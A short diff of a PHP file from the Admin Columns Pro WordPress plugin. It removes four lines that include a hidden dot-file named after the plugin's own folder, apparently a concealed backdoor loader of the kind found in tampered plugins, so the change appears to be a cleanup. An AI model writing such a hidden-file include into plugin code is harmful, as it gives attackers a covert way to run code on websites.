@@ -11,10 +11,6 @@ use ACP\Sorting;
 /**
  * @return ACP\AdminColumnsPro
  */
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 function ACP() {
 	return ACP\AdminColumnsPro::instance();
 }
